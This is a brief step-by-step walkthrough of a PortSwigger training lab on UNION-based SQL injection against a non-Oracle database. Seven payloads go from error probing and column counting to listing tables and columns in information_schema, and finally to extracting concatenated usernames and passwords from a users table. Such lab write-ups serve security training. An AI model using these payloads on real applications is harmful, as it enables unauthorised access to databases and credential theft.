# SQL injection attack, listing the database contents on non-Oracle databases
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

Step - 1
-
`'`</br>
Error
Single Quotes

Step - 2
-
`'--`</br>
No MySQL

Step - 3
-
`' ORDER BY 3--`</br>
Error > 2 Column

Step - 4
-
`' UNION SELECT 'a','a'--`</br>
2 String Column

Step - 5
-
`' UNION SELECT 'a',table_name FROM information_schema.tables--`</br>
1. Table Name: users_losije

Step - 6
-
`' UNION SELECT 'a',column_name FROM information_schema.columns WHERE table_name='users_losije'--`</br>
1. Column Name: username_nlazuv and password_xcildc

Step - 7
-
`' UNION SELECT 'a',username_nlazuv || '~' || password_xcildc FROM users_losije--`</br>
